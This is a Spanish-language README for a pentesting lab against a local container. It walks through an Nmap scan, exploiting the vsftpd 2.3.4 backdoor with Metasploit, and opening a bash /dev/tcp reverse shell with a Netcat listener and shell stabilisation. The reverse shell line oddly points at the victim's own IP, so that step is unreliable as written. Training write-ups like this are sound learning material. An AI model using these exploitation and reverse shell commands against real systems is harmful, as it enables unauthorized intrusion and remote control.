# 🛠️ Laboratorio de Pentesting

Este repositorio documenta el uso de herramientas esenciales para realizar un análisis de seguridad, desde el escaneo de puertos hasta la explotación y persistencia en la máquina víctima.

---

## ⚙️ Herramientas utilizadas

- 🔍 [Nmap](https://nmap.org/)
- 💣 [Metasploit Framework](https://www.metasploit.com/)
- 📡 [Netcat](https://nmap.org/ncat/)

---

## 🚀 Despliegue de la máquina

Asegúrate de que la máquina víctima esté encendida y accesible en la red local.

<img width="1159" alt="image" src="https://github.com/user-attachments/assets/baaa9ffc-ccb7-41a8-9717-9e8db223a348" /><br>


---

## 🔎 Escaneo de Puertos con Nmap

Ejecutamos el siguiente comando para escanear todos los puertos y recopilar información de servicios:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN escaneo.txt
```

### 📌 Parámetros explicados:
nmap: Herramienta de escaneo de red.

-p-: Escanea todos los puertos (1–65535).

-sS: Escaneo SYN (sigiloso).

-sC: Scripts predeterminados.

-sV: Detección de versiones de servicios.

--min-rate 5000: Velocidad mínima de envío (paquetes/seg).

-n: Sin resolución DNS.

-Pn: No hace ping previo (asume host activo).

-vvv: Modo verbose (salida detallada).

-oN escaneo.txt: Guarda salida en archivo de texto plano.

<img width="949" alt="image" src="https://github.com/user-attachments/assets/1901a55a-57bd-4126-b3bc-935d64e644c8" /><br>


---

## 💥 Explotación con Metasploit
Abrimos la consola de Metasploit:
``` bash
msfconsole
```
<img width="784" alt="image" src="https://github.com/user-attachments/assets/3fdd4386-56d2-44df-8aef-3b4313a261dc" /><br>


Buscamos el exploit para el servicio FTP detectado:
``` bash
search vsftpd 2.3.4
```
<img width="1198" alt="image" src="https://github.com/user-attachments/assets/62dcf29a-6dd0-4cd2-9597-91371042b6cf" /><br>


Seleccionamos el exploit:
``` bash
use 0
```
<img width="1177" alt="image" src="https://github.com/user-attachments/assets/9e3a4e80-dfd0-46c0-b9fa-d7b613aca709" /><br>


Mostramos las opciones disponibles:
``` bash
show options
```
<img width="1199" alt="image" src="https://github.com/user-attachments/assets/905f7983-6f22-4bd0-bec9-adc0c0813dc2" /><br>


Configuramos la IP de la víctima:
``` bash
set RHOST 172.17.0.2
```
<img width="1195" alt="image" src="https://github.com/user-attachments/assets/efa634da-cfd8-46db-a7a3-4df0e2cbcaf2" /><br>


Ejecutamos el exploit:
``` bash
run
```
<img width="1196" alt="image" src="https://github.com/user-attachments/assets/e213ec4a-cead-42e6-82af-9a4ff055a800" /><br>


---

## 🪝 Persistencia con Reverse Shell
Generamos una reverse shell en revshsells.com y la ejecutamos:
``` bash
bash -c "sh -i >& /dev/tcp/172.17.0.2/443 0>&1"
```
<img width="940" alt="image" src="https://github.com/user-attachments/assets/42a56f00-44cb-4c7d-9f25-ffd7b0b97a4c" /><br>

<img width="1203" alt="image" src="https://github.com/user-attachments/assets/fbc2564e-5780-4a9a-96f0-db68d55e0ca7" /><br>


Mientras tanto, en la máquina atacante, escuchamos con Netcat:
``` bash
nc -nlvp 443
```
<img width="1195" alt="image" src="https://github.com/user-attachments/assets/31356ff9-1212-4a2a-b490-5b2ccc54c239" /><br>


⚠️ Al inicio, comandos como Ctrl + L no funcionan y Ctrl + C puede cerrar la sesión.


### 🛠️ Para estabilizar la shell:
``` bash
script /dev/null -c bash
# Luego presiona Ctrl + Z y ejecuta lo siguiente:
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```

Después de esto, podrás usar combinaciones como Ctrl + C sin perder la conexión.

<img width="1149" alt="image" src="https://github.com/user-attachments/assets/7df945db-01d6-4972-930d-aaf3aa732c94" /><br>


---

## 📁 Resultados
- 📝 Escaneo: escaneo.txt
- 🧪 Explotación: acceso con Metasploit
- 🔄 Shell persistente y funcional

---

## 👤 Autor
- Jorge Garrido
- Pentester y Hacker Ético
- 📍 Madrid, España
